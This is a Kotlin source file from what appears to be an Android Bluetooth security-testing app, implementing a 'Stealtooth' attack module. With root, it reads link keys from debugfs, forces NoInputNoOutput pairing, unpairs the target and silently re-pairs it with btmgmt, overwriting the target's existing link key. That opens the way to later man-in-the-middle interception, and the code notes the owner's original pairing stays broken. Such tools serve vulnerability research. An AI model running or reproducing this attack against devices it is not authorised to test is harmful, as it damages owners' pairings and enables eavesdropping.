package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Stealtooth attack module.
 *
 * Tests whether a target device is susceptible to silent automatic re-pairing
 * attacks that can overwrite legitimate link keys, as described in the paper
 * arxiv.org/abs/2507.00847.
 *
 * The attack exploits the fact that some Bluetooth Classic devices will accept a
 * new pairing request with NoInputNoOutput IO capability without prompting the
 * user for confirmation. If the target silently re-pairs, the attacker can
 * overwrite the existing link key, enabling future Man-in-the-Middle attacks.
 *
 * Attack flow:
 * 1. Validate MAC address
 * 2. Check root access (required for btmgmt and debugfs)
 * 3. Save existing link keys from debugfs
 * 4. Set IO capability to NoInputNoOutput (btmgmt io-cap 3)
 * 5. Remove existing bond if present (btmgmt unpair)
 * 6. Attempt silent re-pairing (btmgmt pair -c 3 -t 1 MAC)
 * 7. Compare old vs new link keys from debugfs
 * 8. If link key changed: VULNERABLE -- target accepted silent re-pairing
 * 9. Cleanup: optionally restore original link key
 *
 * Root is required because btmgmt and debugfs access are privileged operations.
 * All privileged operations are executed through [RootExecutor].
 */
class StealtoothModule {

    companion object {
        private const val TAG = "StealtoothModule"

        /** Path to the HCI link keys in debugfs. */
        private const val LINK_KEYS_PATH = "/sys/kernel/debug/bluetooth/hci0/link_keys"
    }

    /**
     * Checks if root access is available via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Reads link keys from debugfs and returns the key for the given MAC address,
     * or null if no key exists for that device.
     *
     * @param mac The target MAC address (uppercase, colon-separated).
     * @return The link key string for the target, or null if not found.
     */
    private suspend fun readLinkKey(mac: String): String? {
        val result = RootExecutor.execute("cat $LINK_KEYS_PATH")
        if (result.startsWith("Error")) {
            Log.w(TAG, "Failed to read link keys: $result")
            return null
        }
        // Each line in the link_keys file has the format: MAC type key
        // e.g., AA:BB:CC:DD:EE:FF 1 0123456789abcdef0123456789abcdef
        for (line in result.lines()) {
            if (line.contains(mac, ignoreCase = true)) {
                // Return the full line so we can compare key values
                return line.trim()
            }
        }
        return null
    }

    /**
     * Extracts just the key portion from a link key line.
     *
     * The link_keys debugfs format is: MAC type key
     *
     * @param linkKeyLine A full line from the link_keys file.
     * @return The hex key string, or the full line if parsing fails.
     */
    private fun extractKey(linkKeyLine: String): String {
        val parts = linkKeyLine.trim().split("\\s+".toRegex())
        return if (parts.size >= 3) parts[2] else linkKeyLine
    }

    /**
     * Starts the Stealtooth attack against a target device.
     *
     * @param targetDevice The device to test.
     * @return A Flow emitting progress logs.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Initializing Stealtooth Pairing Attack...")
        emit("Target: ${targetDevice.name ?: "Unknown Device ($mac)"}")
        emit("Reference: arxiv.org/abs/2507.00847")
        emit("")

        // Step 1: Check root access
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("btmgmt and debugfs access require root. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check that btmgmt is available
        val btmgmtAvailable = checkBinary("btmgmt")
        if (!btmgmtAvailable) {
            emit("ERROR: btmgmt binary not found.")
            emit("Install BlueZ management utilities to use Stealtooth. Aborting.")
            return@flow
        }
        emit("btmgmt binary found.")

        // Step 2: Save existing link keys for the target from debugfs
        emit("")
        emit("=== Phase 1: Baseline Link Key ===")
        emit("Reading existing link keys from debugfs...")
        val originalLinkKeyLine = readLinkKey(mac)
        if (originalLinkKeyLine != null) {
            val originalKey = extractKey(originalLinkKeyLine)
            emit("Existing link key found for $mac")
            emit("  Key: $originalKey")
        } else {
            emit("No existing link key found for $mac.")
            emit("The device is not currently bonded with this host.")
        }

        // Step 3: Set IO capability to NoInputNoOutput
        emit("")
        emit("=== Phase 2: Configure IO Capability ===")
        emit("Setting IO capability to NoInputNoOutput (io-cap 3)...")
        val ioCapResult = RootExecutor.execute("btmgmt io-cap 3")
        if (ioCapResult.startsWith("Error")) {
            emit("WARNING: Failed to set IO capability: $ioCapResult")
            emit("Continuing anyway -- pairing may use default capability.")
        } else {
            emit("IO capability set to NoInputNoOutput.")
            for (line in ioCapResult.lines()) {
                if (line.isNotBlank()) {
                    emit("  io-cap: $line")
                }
            }
        }

        // Step 4: Remove existing bond if present
        emit("")
        emit("=== Phase 3: Remove Existing Bond ===")
        emit("Removing existing bond for $mac...")
        val unpairResult = RootExecutor.execute("btmgmt unpair $mac")
        if (unpairResult.startsWith("Error")) {
            emit("No existing bond to remove (or unpair failed): $unpairResult")
        } else {
            emit("Existing bond removed.")
            for (line in unpairResult.lines()) {
                if (line.isNotBlank()) {
                    emit("  unpair: $line")
                }
            }
        }

        // Step 5: Attempt silent re-pairing
        emit("")
        emit("=== Phase 4: Silent Re-Pairing Attempt ===")
        emit("Attempting silent pairing with NoInputNoOutput capability...")
        emit("Executing: btmgmt pair -c 3 -t 1 $mac")
        val pairResult = RootExecutor.execute("btmgmt pair -c 3 -t 1 $mac")

        for (line in pairResult.lines()) {
            if (line.isNotBlank()) {
                emit("  pair: $line")
            }
        }

        // Step 6: Check if a new link key was written
        emit("")
        emit("=== Phase 5: Link Key Analysis ===")
        emit("Reading link keys after pairing attempt...")
        val newLinkKeyLine = readLinkKey(mac)

        val result: StealtoothResult
        if (newLinkKeyLine != null) {
            val newKey = extractKey(newLinkKeyLine)
            emit("Link key found for $mac after pairing attempt.")
            emit("  Key: $newKey")

            if (originalLinkKeyLine != null) {
                val originalKey = extractKey(originalLinkKeyLine)
                if (newKey != originalKey) {
                    // Link key changed -- the device accepted silent re-pairing
                    result = StealtoothResult.VULNERABLE
                    emit("")
                    emit("LINK KEY CHANGED!")
                    emit("  Old key: $originalKey")
                    emit("  New key: $newKey")
                } else {
                    // Link key is the same -- no silent re-pairing occurred
                    result = StealtoothResult.NOT_VULNERABLE
                    emit("")
                    emit("Link key unchanged. No silent re-pairing occurred.")
                }
            } else {
                // No original key existed, but a new one was created
                result = StealtoothResult.VULNERABLE
                emit("")
                emit("NEW LINK KEY CREATED!")
                emit("Device was not previously bonded, but accepted silent pairing.")
            }
        } else {
            // No link key after pairing attempt
            if (pairResult.uppercase().let {
                    it.contains("REJECTED") || it.contains("DENIED") || it.contains("FAILED")
                }) {
                result = StealtoothResult.NOT_VULNERABLE
                emit("Pairing was rejected by the target. No link key written.")
            } else if (pairResult.uppercase().let {
                    it.contains("TIMEOUT") || it.contains("TIMED OUT")
                }) {
                result = StealtoothResult.INCONCLUSIVE
                emit("Pairing timed out. Target may be out of range.")
            } else {
                result = StealtoothResult.INCONCLUSIVE
                emit("No link key found after pairing attempt. Result inconclusive.")
            }
        }

        // Step 7: Final assessment
        emit("")
        emit("=== Stealtooth Assessment ===")
        when (result) {
            StealtoothResult.VULNERABLE -> {
                emit("Result: VULNERABLE")
                emit("The target accepted silent automatic re-pairing without user")
                emit("confirmation. An attacker could overwrite legitimate link keys")
                emit("and enable future Man-in-the-Middle attacks.")
                Log.w(TAG, "Stealtooth VULNERABLE: $mac accepted silent re-pairing")
            }
            StealtoothResult.NOT_VULNERABLE -> {
                emit("Result: NOT VULNERABLE")
                emit("The target rejected silent re-pairing or the link key was not")
                emit("overwritten. The device properly enforces pairing confirmation.")
            }
            StealtoothResult.INCONCLUSIVE -> {
                emit("Result: INCONCLUSIVE")
                emit("The test could not determine vulnerability. The target may be")
                emit("out of range, not responding, or in a state that prevented the")
                emit("test from completing. Retry when the target is nearby.")
            }
            StealtoothResult.ERROR -> {
                emit("Result: ERROR")
                emit("An error occurred during the test. Check logs for details.")
            }
        }

        // Step 8: Cleanup -- remove test bond
        emit("")
        emit("=== Cleanup ===")
        if (newLinkKeyLine != null) {
            emit("Removing test bond...")
            val cleanupResult = RootExecutor.execute("btmgmt unpair $mac")
            if (cleanupResult.startsWith("Error")) {
                emit("Cleanup unpair failed: $cleanupResult")
            } else {
                emit("Test bond removed.")
            }
        }

        // Restore original link key if one existed and was overwritten
        if (originalLinkKeyLine != null && result == StealtoothResult.VULNERABLE) {
            emit("Note: The original link key was overwritten during testing.")
            emit("The target device may need to be re-paired manually by its owner.")
        }

        emit("")
        emit("Stealtooth attack complete.")
    }

    /**
     * Checks if a binary is available in PATH via root shell.
     */
    private suspend fun checkBinary(name: String): Boolean {
        val result = RootExecutor.execute("which $name")
        return !result.startsWith("Error") && result.isNotBlank()
    }
}

/**
 * Result of a Stealtooth attack test.
 */
enum class StealtoothResult {
    /** Target accepted silent re-pairing -- link key was overwritten. */
    VULNERABLE,

    /** Target rejected silent re-pairing or link key was unchanged. */
    NOT_VULNERABLE,

    /** Test could not determine vulnerability (timeout, out of range, etc.). */
    INCONCLUSIVE,

    /** An error prevented the test from running. */
    ERROR
}
